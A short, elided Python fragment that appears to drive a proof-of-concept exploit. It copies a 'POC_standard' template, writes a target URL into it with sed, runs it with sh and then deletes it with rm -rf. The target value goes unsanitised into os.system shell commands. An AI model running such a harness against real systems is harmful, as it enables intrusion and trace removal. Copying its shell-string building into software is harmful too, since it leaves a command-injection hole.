...
os.system("cp %s/POC_standard %s/final_execute"%(win,win))
...
os.system("sed -i 's/<url>/%s/g' %s/final_execute"%(target,win))
#os.system("sed -i 's/<port>/%s/g' %s/final_execute"%(target['port'],solr))
#os.system("sed 's/<ip>/%s/'  %s"%(solr,target['ip']))


#RUN
os.system("sh %s/final_execute"%(win))


#Delete
os.system("rm -rf  %s/final_execute"%(win))
